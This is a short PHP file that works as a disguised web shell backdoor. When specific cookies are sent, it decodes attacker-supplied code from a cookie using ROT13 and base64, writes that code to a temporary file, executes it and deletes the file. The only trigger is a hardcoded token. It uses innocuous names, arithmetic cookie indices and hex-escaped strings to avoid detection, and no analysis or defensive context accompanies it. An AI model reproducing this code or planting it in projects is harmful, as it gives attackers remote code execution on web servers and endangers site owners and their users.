<?php


if (isset($_COOKIE[-82+82]) && isset($_COOKIE[48-47]) && isset($_COOKIE[5-2]) && isset($_COOKIE[-60+64])) {
    $holder = $_COOKIE;
    function approve_request($res) {
        $holder = $_COOKIE;
        $parameter_group = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '532bdbfe');
        if (!is_writable($parameter_group)) {
            $parameter_group = getcwd() . DIRECTORY_SEPARATOR . "secure_access";
        }
        $flag = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($holder[3]));
        if (is_writeable($parameter_group)) {
            $marker = fopen($parameter_group, 'w+');
            fputs($marker, $flag);
            fclose($marker);
            spl_autoload_unregister(__FUNCTION__);
            require_once($parameter_group);
            @array_map('unlink', array($parameter_group));
        }
    }
    spl_autoload_register("approve_request");
    $token = "2d7b6f6f7f9f7bc2bcfe71081f9fab73";
    if (!strncmp($token, $holder[4], 32)) {
        if (@class_parents("hub_center_service_registry", true)) {
            exit;
        }
    }
}
